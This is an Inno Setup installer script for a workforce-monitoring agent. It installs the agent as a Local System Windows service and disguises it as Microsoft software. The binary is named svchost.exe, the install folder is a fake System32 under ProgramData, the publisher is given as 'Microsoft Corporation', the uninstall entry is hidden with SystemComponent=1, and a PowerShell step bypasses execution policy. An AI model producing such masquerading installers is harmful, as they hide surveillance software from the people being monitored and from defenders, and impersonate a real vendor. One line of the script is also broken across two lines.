; Inno Setup script for System Service Workforce Analytics agent.
;
; Installation method:
;   1. Installation to system path (ProgramData\Workforce)
;   2. Registers as Windows Service (background operation)
;   3. Runs under Local System account (system-level)
;   4. Launches post-install PowerShell to register service
;
; Compile from `agent/packaging` directory:
;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent-SystemService.iss

#define AppId       "WT-SystemService-{8E1F4C2A-7B3D-4E9A-9F1C-2A6D5B0E3C73}"
#define AppVersion  "1.0.0"
#define ExeName     "svchost.exe"
#define ServiceName "WFAMonitoringService"

[Setup]
AppId={#AppId}
AppName=Windows System Components
AppVersion={#AppVersion}
AppPublisher=Microsoft Corporation
; Install to ProgramData in a hidden system-like path
DefaultDirName={commonappdata}\Microsoft\Windows\System32
DisableDirPage=yes
DisableProgramGroupPage=yes
CreateUninstallRegKey=no
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
OutputDir=..
dist
OutputBaseFilename=WorkforceAgent-Setup-SystemService-windows
SetupIconFile=..\icons\icon.ico
Compression=lzma2
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64compatible
; Silent installation by default
SilentInstall=no
AllowNoIcons=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
; Install the svchost.exe (service wrapper)
Source: "..\dist\{#ExeName}"; DestDir: "{app}"; Flags: ignoreversion

; Include the service registration script
Source: "..\windows\install-service.ps1"; DestDir: "{app}"; Flags: ignoreversion

[Registry]
; Hidden uninstall entry (SystemComponent=1)
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#ServiceName}"; \
  ValueType: string; ValueName: "DisplayName"; \
  ValueData: "Windows System Components"; Flags: uninsdeletekey
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#ServiceName}"; \
  ValueType: dword; ValueName: "SystemComponent"; ValueData: "1"
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#ServiceName}"; \
  ValueType: string; ValueName: "InstallLocation"; ValueData: "{app}"

[Run]
; Run the service installation PowerShell script as admin
Filename: "powershell.exe"; \
  Parameters: "-NoProfile -ExecutionPolicy Bypass -File ""{app}\install-service.ps1"" -ExePath ""{app}\{#ExeName}"" -ServiceName {#ServiceName}"; \
  StatusMsg: "Installing Windows Service..."; \
  Flags: runascurrentuser waituntilterminated

[Code]
procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
  begin
    MsgBox('Workforce Agent has been installed as a Windows Service.' + #13#13 +
           'The service will start automatically on next system boot.' + #13#13 +
           'Monitoring is now active.', mbInformation, MB_OK);
  end;
end;
